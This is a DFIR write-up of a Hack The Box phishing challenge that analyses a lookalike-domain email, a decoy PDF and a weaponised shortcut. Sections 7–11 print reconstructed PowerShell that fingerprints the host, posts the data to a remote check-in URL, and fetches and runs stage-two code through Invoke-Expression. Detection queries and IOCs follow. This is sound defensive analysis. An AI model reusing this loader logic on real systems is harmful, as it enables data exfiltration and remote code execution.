# Advent of the Relics 1: A Call from the Museum
## Part 1 — Phishing Email & Malicious Attachment Analysis

**Platform:** Hack The Box Sherlock  
**Category:** Phishing Analysis / DFIR  
**Analyst:** Ryley Steiner  
**Incident Type:** Phishing / Malicious Attachment / PowerShell Execution  
**Severity:** High  
**Classification:** True Positive  
**Initial Email Timestamp:** 14 November 2025, 20:33 UTC  
**Status:** Part 1 Analysis Complete

---

## Executive Summary

A CALE employee received an unexpected health and customs compliance email containing a password-protected ZIP archive.

The message appeared to originate from a trusted organizational source but instead used the lookalike domain `ca1e-corp.org`, replacing the lowercase letter `l` in the legitimate domain `cale-corp.org` with the numeral `1`.

The archive contained a decoy PDF and a weaponized Windows shortcut (`.lnk`) file.

Analysis of the shortcut revealed an obfuscated PowerShell command designed to:

1. Open the decoy PDF.
2. Collect the current username, Windows domain, and machine GUID.
3. Send the collected host information to a remote check-in endpoint.
4. Receive an identifier from the remote infrastructure.
5. Use that identifier to request additional PowerShell content.
6. Execute the returned content using `Invoke-Expression`.

The shortcut also reconstructed a Base64-encoded HTTP Basic Authentication credential at runtime for use with the secondary request.

The incident was classified as **High severity** because the attachment contained confirmed malicious execution logic capable of collecting host information, communicating with remote infrastructure, retrieving additional attacker-controlled content, and executing that content through PowerShell.

---

# 1. Initial Email Analysis

**Subject:** URGENT: Updated Health & Customs Compliance for Cross-Border Festive Event  
**Sender:** EU Health Logistics Office `<eu-health@ca1e-corp.org>`  
**Recipient:** `kamil.poltavez@cale-corp.org`  
**Date:** 14 November 2025, 20:33 UTC  
**Attachment:** `Health_Clearance-December_Archive.zip`

The sender domain closely resembled the legitimate CALE domain:

```text
Legitimate: cale-corp.org
Phishing:   ca1e-corp.org
               ^
               numeral "1"
```

This is consistent with **lookalike-domain impersonation**, where visually similar characters are used to deceive the recipient.

The message also used urgent compliance-related language intended to pressure the user into interacting with the attached archive.

---

# 2. Email Authentication Results

## SPF

**Result:** Pass

The applicable sending infrastructure was authorized under the sender domain's SPF policy.

An SPF pass does not establish that an email is legitimate. An attacker controlling a lookalike domain can configure valid SPF records for that domain.

---

## DKIM

**Result:** None

No DKIM signature was present on the message.

As a result, the email could not be authenticated through DKIM signature validation.

---

## DMARC

**Result:** None

No applicable DMARC authentication or enforcement result was reported for the sender domain.

---

## ARC

**Result:** Pass

The Authenticated Received Chain validated successfully.

ARC preserves authentication information across mail-forwarding systems but does not independently establish that the original sender or message is trustworthy.

---

# 3. Phishing Indicators

The following characteristics increased the likelihood that the message was malicious:

- Lookalike sender domain
- Numeral substitution in the organization name
- Urgent compliance-themed language
- Unexpected external message
- Password-protected archive
- Windows shortcut contained inside the archive
- Obfuscated PowerShell embedded in the shortcut
- Encoded remote network destinations
- Runtime reconstruction of HTTP credentials

## Assessment

The message was not classified as malicious based on a single authentication result.

The combination of sender impersonation, social engineering, suspicious attachment structure, and confirmed malicious PowerShell logic established the message as a **true-positive phishing incident**.

---

# 4. Attachment Analysis

The email contained the following archive:

```text
Health_Clearance-December_Archive.zip
```

After controlled extraction, the archive contained:

```text
EU_Health_Compliance_Portal.lnk
Health_Clearance_Guidelines.pdf
```

The PDF contained the document identifier:

```text
EU-HMU-24X
```

The PDF acted as a decoy document intended to reinforce the legitimacy of the phishing lure.

The `.lnk` file served as the execution mechanism.

---

# 5. Malicious Shortcut Analysis

The shortcut launched:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
```

with parameters including:

```text
-nONi
-nOp
-eXeC bYPaSs
-cOmManD
```

These correspond to behavior such as:

- Non-interactive PowerShell execution
- No profile loading
- Execution-policy bypass
- Direct command execution

The inconsistent capitalization and inserted PowerShell escape characters provided basic command obfuscation.

## MITRE ATT&CK

- **T1204.002 — User Execution: Malicious File**
- **T1059.001 — Command and Scripting Interpreter: PowerShell**

---

# 6. Decoy Document Execution

The PowerShell contained:

```powershell
saps .\Health_Clearance_Guidelines.pdf
```

`saps` is an alias for:

```powershell
Start-Process
```

This command was designed to open the PDF while the remaining PowerShell logic continued executing.

## Analyst Assessment

Opening the decoy PDF would reduce user suspicion by making it appear that the shortcut had simply opened expected health-compliance documentation.

This allowed malicious activity to continue while preserving the appearance of normal user interaction.

---

# 7. Host Identification and Registry Access

The malicious PowerShell collected identifying information from the host:

```powershell
$username = $env:USERNAME
$domain   = $env:USERDOMAIN

$machineGuid = (
    Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Cryptography'
).MachineGuid
```

The script collected:

- Current username
- Windows domain
- Machine GUID

The registry path accessed was:

```text
HKLM\SOFTWARE\Microsoft\Cryptography
```

The value retrieved was:

```text
MachineGuid
```

The values were combined into a POST body:

```powershell
$body = @{
    u = $username
    d = $domain
    g = $machineGuid
}
```

## Analyst Assessment

The combination of username, domain, and Machine GUID would allow remote infrastructure to distinguish one host from another and associate subsequent requests with a specific system.

Registry access to `MachineGuid` is not inherently malicious. Its significance comes from the surrounding context: the value was collected by obfuscated PowerShell launched from a weaponized `.lnk` file and prepared for transmission to remote infrastructure.

## MITRE ATT&CK

- **T1033 — System Owner/User Discovery**

---

# 8. Basic Authentication Credential Reconstruction

The PowerShell reconstructed an HTTP Basic Authentication credential from Base64-encoded data.

The behavior was equivalent to:

```powershell
$basicAuth = [System.Text.Encoding]::ASCII.GetString(
    [System.Convert]::FromBase64String('<REDACTED_BASE64>')
)
```

The decoded account name was:

```text
svc_temp
```

The associated password is intentionally redacted from this public report.

## Analyst Assessment

The use of Base64 encoding obscured the credential from casual inspection but did not provide encryption.

The reconstructed credential was later placed into an HTTP Authorization header and used when requesting secondary content.

This is an important distinction:

> Base64 is encoding, not encryption.

---

# 9. Initial Remote Check-In

The PowerShell decoded the following URL:

```text
hxxps://health-status-rs[.]com/api/v1/checkin
```

The script was designed to send the collected host information using:

```powershell
Invoke-WebRequest -Method POST
```

The logic was equivalent to:

```powershell
$response = (
    Invoke-WebRequest $checkInUrl -Method POST -Body $body
).Content
```

## Analyst Assessment

This request appears designed to function as a host-registration or check-in mechanism.

The username, domain, and machine GUID were packaged and sent to remote infrastructure, which was expected to return an identifier used during the next stage of execution.

---

# 10. Secondary Payload Retrieval

A second URL was decoded:

```text
hxxps://advent-of-the-relics-forum[.]htb[.]blue/api/v1/implant/cid=
```

The identifier returned from the initial check-in was appended to this URL.

The script then created an HTTP Authorization header using the decoded Basic Authentication value:

```powershell
$headers = @{
    Authorization = $basicAuth
}
```

The script was then designed to request additional content from the secondary endpoint.

At a simplified level:

```powershell
Invoke-WebRequest -Headers $headers ($implantUrl + $response)
```

---

# 11. Dynamic PowerShell Execution

The result of the secondary request was piped directly into:

```powershell
iex
```

`iex` is an alias for:

```powershell
Invoke-Expression
```

The intended execution flow was:

```text
Remote HTTP Request
        |
        v
Returned PowerShell Content
        |
        v
Invoke-Expression
        |
        v
Immediate Execution
```

## Analyst Assessment

The script was designed to execute remotely supplied PowerShell without first requiring a conventional executable payload to be written to disk.

This behavior increases the importance of:

- Process creation telemetry
- PowerShell script-block logging
- Command-line logging
- EDR telemetry
- DNS logs
- Proxy/firewall logs

## MITRE ATT&CK

- **T1059.001 — PowerShell**
- **T1071.001 — Application Layer Protocol: Web Protocols**
- **T1105 — Ingress Tool Transfer**

---

# 12. Deobfuscated Behavior Summary

At a high level, the malicious shortcut was designed to:

```text
1. Decode an HTTP Basic Authentication credential
2. Open the decoy PDF
3. Collect the current username
4. Collect the Windows domain
5. Read the MachineGuid from the Windows Registry
6. Package host-identification information
7. POST the information to a remote check-in endpoint
8. Receive a client or host identifier
9. Append the identifier to a secondary URL
10. Authenticate to the secondary endpoint
11. Retrieve additional PowerShell content
12. Execute returned content using Invoke-Expression
```

---

# 13. Attack Chain

```text
Phishing Email
      |
      v
Password-Protected ZIP
      |
      +-----------------------------+
      |                             |
      v                             v
Decoy PDF                    Malicious .lnk
                                   |
                                   v
                            powershell.exe
                                   |
                  +----------------+----------------+
                  |                                 |
                  v                                 v
            Open Decoy PDF                 Collect Host Data
                                           - Username
                                           - Domain
                                           - Machine GUID
                                                  |
                                                  v
                                      Build Registration Body
                                                  |
                                                  v
                                       POST to Check-In URL
                                                  |
                                                  v
                                     Expected Host Identifier
                                                  |
                                                  v
                                    Authenticate to Stage 2
                                                  |
                                                  v
                                  Retrieve PowerShell Content
                                                  |
                                                  v
                                      Invoke-Expression
```

---

# 14. Indicators of Compromise

## Email Indicators

| Type | Value |
|---|---|
| Sender | `eu-health@ca1e-corp.org` |
| Lookalike Domain | `ca1e-corp.org` |
| Legitimate Domain | `cale-corp.org` |
| Subject | `URGENT: Updated Health & Customs Compliance for Cross-Border Festive Event` |
| Attachment | `Health_Clearance-December_Archive.zip` |

## File Indicators

| Type | Value |
|---|---|
| Archive | `Health_Clearance-December_Archive.zip` |
| Shortcut | `EU_Health_Compliance_Portal.lnk` |
| LNK SHA-256 | `e5389af56fae1ed9c3eb85a96bd0f0a2493cec8129c7767bb6b792d1f583144e` |
| PDF | `Health_Clearance_Guidelines.pdf` |
| Document Code | `EU-HMU-24X` |

## Network Indicators

| Type | Value |
|---|---|
| Check-In URL | `hxxps://health-status-rs[.]com/api/v1/checkin` |
| Secondary Endpoint | `hxxps://advent-of-the-relics-forum[.]htb[.]blue/api/v1/implant/cid=` |
| Secondary Auth User | `svc_temp` |
| Password | `[REDACTED]` |

---

# 15. VirusTotal Enrichment

The SHA-256 hash of `EU_Health_Compliance_Portal.lnk` was analyzed using VirusTotal:

```text
e5389af56fae1ed9c3eb85a96bd0f0a2493cec8129c7767bb6b792d1f583144e
```

VirusTotal was used as a supporting enrichment source for:

- File reputation
- Antivirus detections
- Metadata
- Behavioral observations
- Associated indicators

The VirusTotal result was not used as the sole basis for classification.

Manual analysis independently demonstrated that the shortcut contained obfuscated PowerShell designed to collect host information, contact remote infrastructure, retrieve additional content, and execute returned PowerShell code.

---

# 16. MITRE ATT&CK Mapping

| Technique | ID | Evidence |
|---|---|---|
| Phishing | T1566 | Malicious email delivered to employee |
| Spearphishing Attachment | T1566.001 | ZIP attachment delivered through email |
| User Execution: Malicious File | T1204.002 | Weaponized `.lnk` required user interaction |
| PowerShell | T1059.001 | `.lnk` launched PowerShell |
| System Owner/User Discovery | T1033 | Username collected |
| Web Protocols | T1071.001 | HTTP/HTTPS used by malicious script |
| Ingress Tool Transfer | T1105 | Script designed to retrieve additional content |

---

# 17. SOC Triage and Escalation Assessment

This incident should be escalated beyond basic email triage because the attachment contained confirmed malicious logic capable of:

- Launching PowerShell
- Reading host-identification data
- Accessing the Windows Registry
- Contacting remote infrastructure
- Authenticating to a secondary endpoint
- Retrieving additional PowerShell
- Executing returned content

## Final Severity

**High**

This was more than a suspicious or unsuccessful phishing email.

The attachment itself contained a staged execution mechanism designed to perform host discovery, remote communication, and dynamic code execution.

---

# 18. Recommended Containment and Response

If this activity occurred in a production environment, recommended response actions would include:

1. Quarantine the original email.
2. Search for matching emails across other mailboxes.
3. Block the lookalike domain.
4. Block identified URLs, domains, and file hashes.
5. Isolate any endpoint where the `.lnk` was executed.
6. Review PowerShell process and script-block logs.
7. Review DNS, proxy, firewall, and EDR telemetry.
8. Search endpoints for the malicious `.lnk` hash.
9. Assess the affected user's account for possible credential or token exposure.
10. Hunt for evidence of additional PowerShell execution.
11. Determine whether other users received or interacted with the same campaign.

---

# 19. Detection Opportunities

## Email Detection

Monitor for:

- Lookalike organizational domains
- Password-protected archives from external senders
- Archives containing `.lnk` files
- Urgent administrative or compliance-themed lures
- Sender-domain variations using visually similar characters

## Endpoint Detection

Potential indicators include:

```text
powershell.exe
ExecutionPolicy Bypass
Invoke-WebRequest
Invoke-Expression
MachineGuid
```

A useful detection should combine multiple suspicious behaviors rather than alerting on PowerShell alone.

---

# 20. Elastic KQL Detection Example

A targeted Elastic KQL hunt for behavior similar to this attack could be:

```text
process.name : "powershell.exe" and
process.command_line : "*MachineGuid*" and
process.command_line : "*Invoke-WebRequest*" and
process.command_line : "*Invoke-Expression*"
```

## Detection Rationale

This query looks for PowerShell processes that combine:

- Access to the Windows `MachineGuid`
- Remote web requests
- Dynamic execution through `Invoke-Expression`

Each behavior can occur legitimately on its own.

The combination is significantly more suspicious because it resembles a staged execution pattern in which a script fingerprints the host, communicates with remote infrastructure, retrieves content, and executes that content dynamically.

## Broader Hunt

A broader hunting query could be:

```text
process.name : "powershell.exe" and
process.command_line : (
    "*ExecutionPolicy*Bypass*" or
    "*Invoke-WebRequest*" or
    "*Invoke-Expression*" or
    "*MachineGuid*"
)
```

This broader query would provide more visibility but would likely generate additional false positives and should be tuned before use as a high-confidence alert.

---

# 21. Campaign Scoping

A production SOC should determine whether the message targeted one employee or represented a broader phishing campaign.

Recommended searches include:

- Same sender address
- Same lookalike domain
- Same email subject
- Same ZIP filename
- Same `.lnk` filename
- Same SHA-256 hash
- Same remote URLs
- Same PowerShell command-line indicators
- Same authorization username
- Similar messages delivered to other employees

---

# 22. Final Assessment

**Classification:** True Positive  
**Severity:** High  
**Initial Access:** Phishing  
**Malicious Attachment:** Confirmed  
**PowerShell Payload Logic:** Confirmed  
**Host Discovery Logic:** Confirmed  
**Remote Retrieval Logic:** Confirmed  
**Observed Scope:** Email and malicious attachment analysis  
**Status:** Part 1 Analysis Complete

The investigation determined that a CALE employee received a phishing email from a lookalike domain containing a password-protected archive.

The archive contained a decoy PDF and a weaponized Windows shortcut.

Analysis of the shortcut showed that it launched obfuscated PowerShell designed to collect host-identification information, access the Windows Registry, contact remote infrastructure, reconstruct and use a Basic Authentication credential, retrieve additional PowerShell content, and execute that content through `Invoke-Expression`.

The activity is consistent with a staged phishing attack designed to obtain code execution while reducing user suspicion through a legitimate-looking decoy document.

---

# 23. Skills Demonstrated

- Phishing triage
- Raw `.eml` analysis
- SPF interpretation
- DKIM interpretation
- DMARC interpretation
- ARC interpretation
- Lookalike-domain identification
- Social-engineering analysis
- Attachment triage
- Windows `.lnk` analysis
- PowerShell analysis
- Basic deobfuscation
- Base64 decoding
- HTTP Basic Authentication analysis
- Windows Registry analysis
- Host-fingerprinting analysis
- VirusTotal enrichment
- IOC extraction
- MITRE ATT&CK mapping
- Elastic KQL detection development
- SOC escalation decisions
- Containment recommendations
- Threat-hunting recommendations

---

# Key Takeaway

The investigation demonstrated that phishing analysis should not stop at identifying a suspicious sender.

The attachment itself revealed a staged execution chain involving a lookalike domain, password-protected archive, malicious shortcut, PowerShell obfuscation, host fingerprinting, registry access, remote communication, credential reconstruction, and dynamic execution.

These findings were sufficient to classify the email as a true-positive phishing incident and identify practical detection and response opportunities for similar activity.
